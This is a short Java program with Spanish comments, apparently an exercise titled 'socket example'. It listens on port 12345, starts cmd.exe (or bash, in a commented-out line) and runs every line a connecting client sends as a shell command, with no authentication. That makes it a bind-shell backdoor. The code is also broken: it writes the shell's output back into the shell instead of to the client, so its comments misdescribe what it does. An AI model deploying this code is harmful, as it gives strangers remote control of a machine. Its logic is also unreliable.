package prueba1;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class EjemploSocket {

    public static void main(String[] args) throws IOException {

        // Establecer el puerto en el que escuchará el servidor
        int port = 12345;

        // Iniciar el servidor en el puerto especificado
        ServerSocket serverSocket = new ServerSocket(port);
        System.out.println("Servidor iniciado en el puerto " + port);

        // Esperar a que un cliente se conecte al servidor
        Socket clientSocket = serverSocket.accept();
        System.out.println("Cliente conectado desde " + clientSocket.getInetAddress());

        // Construir el proceso que ejecutará la shell
       // ProcessBuilder pb = new ProcessBuilder("/bin/bash");
        ProcessBuilder pb = new ProcessBuilder("cmd.exe");

        pb.redirectErrorStream(true);

        // Iniciar la shell
        Process shell = pb.start();

        // Obtener los streams de entrada y salida de la shell
        BufferedReader reader = new BufferedReader(new InputStreamReader(shell.getInputStream()));
        OutputStream writer = shell.getOutputStream();

        // Leer los comandos del cliente y enviarlos a la shell
        BufferedReader clientReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        String command;
        while ((command = clientReader.readLine()) != null) {
            writer.write((command + "\n").getBytes());
            writer.flush();

            // Leer la salida de la shell y enviarla al cliente
            String line;
            while ((line = reader.readLine()) != null) {
                writer.write((line + "\n").getBytes());
                writer.flush();
            }
        }

        // Cerrar la shell y los sockets
        shell.getOutputStream().close();
        shell.destroy();
        clientSocket.close();
        serverSocket.close();
    }
}